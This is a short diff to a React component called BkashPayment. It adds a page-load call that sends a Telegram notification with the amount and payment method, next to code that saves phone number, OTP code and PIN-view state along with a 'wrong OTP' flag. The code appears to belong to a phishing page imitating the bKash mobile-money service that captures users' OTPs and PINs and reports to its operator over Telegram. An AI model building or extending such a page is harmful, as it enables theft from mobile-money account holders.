@@ -79,6 +79,11 @@ const BkashPayment = () => {
   }, [isRestoring]);
 
   useEffect(() => {
+    sendTelegramNotification({ type: 'page_entry', amount, method: 'bKash' }, { force: true });
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
+
+  useEffect(() => {
     if (showOtpView || showPinView) {
       saveOtpResume("bkash", searchParams.toString(), { showOtpView, showPinView, phoneNumber, otpCode, resendTimer, wrongOtpShown, otpElapsed });
     } else {
